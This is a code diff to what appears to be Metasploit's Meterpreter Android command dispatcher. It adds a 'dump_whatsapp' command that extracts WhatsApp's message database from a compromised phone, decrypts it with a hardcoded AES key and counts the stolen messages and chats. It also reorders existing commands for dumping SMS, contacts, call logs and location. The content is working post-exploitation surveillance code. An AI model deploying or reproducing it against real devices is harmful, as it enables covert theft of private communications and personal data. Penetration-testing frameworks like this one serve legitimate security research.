@@ -1,5 +1,6 @@
 # -*- coding: binary -*-
 require 'rex/post/meterpreter'
+require 'sqlite3'
 
 module Rex
 module Post
@@ -25,20 +26,23 @@ class Console::CommandDispatcher::Android
   #
  def commands
     all = {
-      "dump_sms"          => "Get sms messages",
-      "dump_contacts"     => "Get contacts list",
-      "geolocate"         => "Get current lat-long using geolocation",
-      "dump_calllog"      => "Get call log",
       "check_root"        => "Check if device is rooted",
-      "device_shutdown"   => "Shutdown device"
+      "device_shutdown"   => "Shutdown device",
+      "dump_calllog"      => "Get call log",
+      "dump_contacts"     => "Get contacts list",
+      "dump_sms"          => "Get sms messages",
+      "dump_whatsapp"     => "Get whatsapp contacts and messages",
+      "geolocate"         => "Get current lat-long using geolocation"
+
     }
 
     reqs = {
-      "dump_sms"   		=> [ "dump_sms" ],
-      "dump_contacts" => [ "dump_contacts"],
-      "geolocate"   	=> [ "geolocate"],
-      "dump_calllog"  => [ "dump_calllog"],
-      "check_root"    => [ "check_root"],
+      "dump_sms"   		  => [ "dump_sms" ],
+      "dump_contacts"   => [ "dump_contacts"],
+      "geolocate"   	  => [ "geolocate"],
+      "dump_calllog"    => [ "dump_calllog"],
+      "dump_whatsapp"   => [ "dump_whatsapp"],
+      "check_root"      => [ "check_root"],
       "device_shutdown" => [ "device_shutdown"]
     }
 
@@ -390,6 +394,63 @@ class Console::CommandDispatcher::Android
     elsif
       print_status("Device is not rooted")
     end
+  end
+
+  def cmd_dump_whatsapp(*args)
+
+    path = "whatsapp_msgstore_" + Rex::Text.rand_text_alpha(4) + ".db"
+    dump_whatsapp_opts = Rex::Parser::Arguments.new(
+      "-h" => [ false, "Help Banner" ]
+      )
+
+    dump_whatsapp_opts.parse( args ) { | opt, idx, val |
+      case opt
+      when "-h"
+        print_line( "Usage: dump_whatsapp [options]\n" )
+        print_line( "Get whatsapp contacts and messages." )
+        print_line( dump_whatsapp_opts.usage )
+        return
+      end
+    } 
+    
+    print_status("Dumping whatsapp local datastores")
+    dbstore = client.android.dump_whatsapp
+    print_status("Datastores were dumped")
+
+    encrypted = dbstore['encrypted']
+
+    if (encrypted)
+      print_status("Decrypting messages datastore")
+
+      cipher = OpenSSL::Cipher::AES192.new(:ECB)
+      cipher.decrypt
+      cipher.key = "346a23652a46392b4d73257c67317e352e3372482177652c".scan(/../).map(&:hex).map(&:chr).join
+
+      ::File.open(path, 'wb') { |file| file.write(cipher.update(encrypted) + cipher.final) }
+
+      print_status("Decrypted msgstore saved to #{path}")
+
+      print_status("Dumping decrypted messages\n")
+
+      begin
+        db = SQLite3::Database.open path
+        messages = db.prepare("SELECT Count(*) FROM messages").execute
+        chat_list = db.prepare("SELECT Count(*) FROM chat_list").execute
+        print_status("Got #{messages.first[0]} messages, #{chat_list.first[0]} in chatlist") 
+
+      rescue SQLite3::Exception => e    
+        print_error("Error getting data from database")
+          
+      ensure
+        chat_list.close if chat_list
+        messages.close if messages
+        db.close if db
+      end
+
+    end
+
+    print_status("Whatsapp was dumped successfully")
+
   end
 
   #
